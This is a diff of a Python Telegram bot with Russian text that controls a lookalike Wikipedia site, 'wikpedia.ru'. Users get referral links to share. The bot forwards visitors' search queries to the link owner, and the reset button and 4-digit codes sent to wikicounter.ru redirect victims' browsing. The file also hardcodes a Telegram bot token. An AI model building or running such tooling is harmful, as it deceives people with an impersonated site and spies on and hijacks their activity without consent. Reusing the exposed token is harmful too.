@@ -1,92 +1,117 @@
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
+from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
 import logging
-from datetime import datetime, timedelta
-from threading import Lock
-import asyncio
 import aiohttp
 
-# Настройка логов
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+BOT_TOKEN = "7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU"
+BASE_SITE_URL = "https://wikpedia.ru"
 
+logging.basicConfig(level=logging.INFO)
 
-BOT_TOKEN = '7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU'
-BASE_SITE_URL = 'https://wikpedia.ru'  # URL вашего Flask-приложения
+# Главное меню
+async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, text="📲 Главное меню:"):
+    keyboard = [
+        [KeyboardButton("🔗 Моя ссылка"), KeyboardButton("🔄 Сбросить всех")],
+        [KeyboardButton("🔢 Ввести код")]
+    ]
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text(text, reply_markup=reply_markup)
 
+# Команда /start
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await show_main_menu(update, context)
+
+# Обработка кнопок меню
+async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    
+    if text == "🔗 Моя ссылка":
+        user_id = update.effective_user.id
+        ref_link = f"{BASE_SITE_URL}?ref={user_id}"
+        await update.message.reply_text(
+            f"🔗 Ваша ссылка:\n{ref_link}",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🌐 Перейти", url=ref_link)]
+            ])
+        )
+    
+    elif text == "🔄 Сбросить всех":
+        user_id = update.effective_user.id
+        async with aiohttp.ClientSession() as session:
+            await session.get(f"{BASE_SITE_URL}/trigger_reset?ref={user_id}")
+        await update.message.reply_text("✅ Сброс выполнен!")
+    
+    elif text == "🔢 Ввести код":
+        context.user_data["awaiting_code"] = True
+        await update.message.reply_text(
+            "🔢 Введите 4-значный код:",
+            reply_markup=ReplyKeyboardMarkup(
+                [[KeyboardButton("🔙 Отмена")]],
+                resize_keyboard=True
+            )
+        )
+
+# Обработка ввода кода
+async def handle_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.user_data.get("awaiting_code"):
+        return
+    
+    text = update.message.text
+    
+    # Обработка отмены
+    if text == "🔙 Отмена":
+        context.user_data["awaiting_code"] = False
+        await show_main_menu(update, context)
+        return
+    
+    # Проверка кода
+    if not text.isdigit() or len(text) != 4:
+        await update.message.reply_text("❌ Введите корректный 4-значный код.")
+        return
+    
     user_id = update.effective_user.id
     ref_link = f"{BASE_SITE_URL}?ref={user_id}"
     
-    keyboard = [
-        [InlineKeyboardButton("🔗 Перейти на сайт", url=ref_link)],
-        [InlineKeyboardButton("🔄 Сбросить всех", callback_data="reset")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(
+                "https://wikicounter.ru/update_code",
+                json={"code": text, "new_url": ref_link}
+            ) as resp:
+                data = await resp.json()
+                if data.get("status") == "success":
+                    await update.message.reply_text(f"✅ Готово! Ваша ссылка:\n{ref_link}")
+                else:
+                    await update.message.reply_text("❌ Код не найден.")
+    except Exception as e:
+        logging.error(f"Error updating code: {e}")
+        await update.message.reply_text("⚠️ Произошла ошибка, попробуйте позже")
     
-    await update.message.reply_text(
-        f"Привет, {update.effective_user.first_name}!\n"
-        f"Вот твоя уникальная ссылка:\n{ref_link}\n\n"
-        "🔎 Поделись ею, чтобы видеть, что ищут другие!\n"
-        "🔄 Нажми 'Сбросить всех', чтобы перенаправить всех на Википедию",
-        reply_markup=reply_markup
-    )
+    context.user_data["awaiting_code"] = False
+    await show_main_menu(update, context)
 
-# reset_callback
-async def reset_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    await update.callback_query.answer()
-
-    async with aiohttp.ClientSession() as session:
-        await session.get(f"{BASE_SITE_URL}/trigger_reset?ref={user_id}")
-
-    await update.callback_query.edit_message_text(
-        "🔄 Сброс выполнен! Пользователи скоро будут перенаправлены на Википедию.",
+# Логи с кнопкой сброса
+async def send_log(context: ContextTypes.DEFAULT_TYPE, user_id: int, query_text: str):
+    await context.bot.send_message(
+        chat_id=user_id,
+        text=f"🔔 Новый поиск!\nЗапрос: {query_text}",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔗 Перейти на сайт", url=f"{BASE_SITE_URL}?ref={user_id}")]
+            [InlineKeyboardButton("🔄 Сбросить", callback_data=f"reset_user_{user_id}")]
         ])
     )
 
-async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    code = update.message.text.strip()
-    
-    if not code.isdigit() or len(code) != 4:
-        await update.message.reply_text("Пожалуйста, введите 4-значный код.")
-        return
-    
-    ref_link = f"{BASE_SITE_URL}/?ref={user_id}"  # URL основного сайта
-    
-    async with aiohttp.ClientSession() as session:
-        async with session.post(
-            "https://wikicounter.ru//update_code",
-            json={'code': code, 'new_url': ref_link}
-        ) as response:
-            result = await response.json()
-            
-            if result.get('status') == 'success':
-                await update.message.reply_text(
-                    "✅ Код принят! Теперь пользователь будет перенаправлен на вашу ссылку.",
-                    reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("🔗 Перейти на сайт", url=ref_link)]
-                    ])
-                )
-            else:
-                await update.message.reply_text("❌ Код не найден или устарел.")
-
-
 def main():
-    application = Application.builder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CallbackQueryHandler(reset_callback, pattern="^reset$"))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code))
+    app = Application.builder().token(BOT_TOKEN).build()
     
-    application.run_polling(drop_pending_updates=True)
+    # Команды
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("menu", show_main_menu))
+    
+    # Обработчики сообщений (важен порядок!)
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^(🔗 Моя ссылка|🔄 Сбросить всех|🔢 Ввести код)$'), handle_menu_buttons))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code_input))
+    
+    app.run_polling()
 
-
-
-if __name__ == '__main__':
-    main()  # Важно! Без этого код не запустится.
+if __name__ == "__main__":
+    main()
